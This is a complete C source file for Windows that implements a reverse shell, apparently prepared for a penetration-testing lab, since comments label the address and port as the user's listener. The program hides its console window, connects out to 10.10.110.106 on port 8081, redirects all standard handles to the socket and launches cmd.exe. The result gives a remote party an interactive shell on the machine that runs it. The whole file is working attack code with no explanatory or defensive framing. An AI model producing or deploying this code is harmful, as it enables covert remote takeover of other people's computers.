#include <windows.h>
#include <stdio.h>

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Initialize Winsock
    WSAStartup(MAKEWORD(2,2), &wsaData);
    
    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    // Configure connection to your listener
    server.sin_family = AF_INET;
    server.sin_port = htons(8081);  // Your LPORT
    server.sin_addr.s_addr = inet_addr("10.10.110.106");  // Your LHOST
    
    // Connect back
    WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);
    
    // Redirect stdin/stdout/stderr to socket
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    
    // Spawn cmd.exe with redirected handles
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}
